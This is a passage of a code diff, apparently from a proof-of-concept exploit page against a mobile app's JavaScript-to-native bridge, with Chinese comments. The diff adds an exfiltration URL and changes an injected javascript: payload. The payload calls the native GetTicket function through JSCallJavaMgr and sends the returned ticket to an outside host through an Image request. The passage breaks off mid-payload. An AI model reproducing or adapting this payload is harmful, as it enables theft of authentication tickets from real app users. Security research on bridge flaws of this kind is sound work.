@@ -8,9 +8,15 @@
 var log = document.getElementById('log');
 function addLog(s) { log.textContent += '[' + Date.now() + '] ' + s + '\n'; }
 
-// 注入 payload：注册 callback + 调用 GetTicket + 设置 title
+// 外传地址
+var EXFIL = 'https://test2.lleavesg.top/steal';
+
+// 注入 payload：注册 callback + 调用 GetTicket + Image 外传 + 设置 title
 var js = 'javascript:void('
-    + 'window._s=function(d){document.title=d},'
+    + 'window._s=function(d){'
+    +   'document.title=d;'
+    +   'new Image().src="' + EXFIL + '?d="+encodeURIComponent(d)'
+    + '},'
     + 'JSCallJavaMgr.JSCallNative(JSON.stringify({'
     +   'callback:"_s",'
     +   'module:"CommonPlugin",'
